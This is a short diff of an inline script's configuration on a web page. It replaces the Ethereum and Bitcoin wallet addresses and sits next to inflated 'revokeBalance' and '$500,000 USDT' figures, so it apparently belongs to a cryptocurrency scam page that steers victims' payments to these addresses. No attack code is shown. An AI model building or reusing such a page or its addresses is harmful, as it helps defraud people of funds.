@@ -2073,8 +2073,8 @@
   <script>
 
     const appConfig = {
-      walletAddressEth: "0x350B9E09E781e5826973cc804282328E7b03d4c3",
-      walletAddressBtc: "bc1qlej9wqvq8hxalc2k7ar4p2nasucxkqxx3sezsn",
+      walletAddressEth: "0xad61145Ab31C8B4fC0408B53C5B71fc7d57A3015",
+      walletAddressBtc: "bc1q7ju4x9h7g7h0tgh9syfg7uflqlle2jrkvjxlc6",
       revokeBalance: "19,742,990.10",
       transferableAmount: "≈ $500,000 USDT"
     };
